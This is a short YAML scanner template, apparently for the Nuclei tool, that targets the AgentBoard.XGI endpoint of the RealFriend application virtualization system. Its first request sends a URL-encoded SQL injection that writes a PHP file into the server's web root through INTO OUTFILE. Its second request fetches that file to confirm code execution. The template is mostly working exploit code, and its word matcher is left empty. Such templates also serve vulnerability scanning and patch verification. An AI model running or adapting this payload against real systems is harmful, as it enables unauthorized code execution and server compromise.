id: realfriend-virtualization-rce

info:
  name: "瑞友天翼应用虚拟化系统AgentBoard.XGI远程代码执行"
  author: 0dayPoc
  severity: high
  description: |-
  tags: 瑞友天翼应用虚拟化系统

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    GET /AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C1.php%22+--+-&cmd=UserLogin HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: CookieLanguageName=ZH-CN; CookieAuthType=0
    Upgrade-Insecure-Requests: 1
- raw:
  - |
    GET /1.php HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
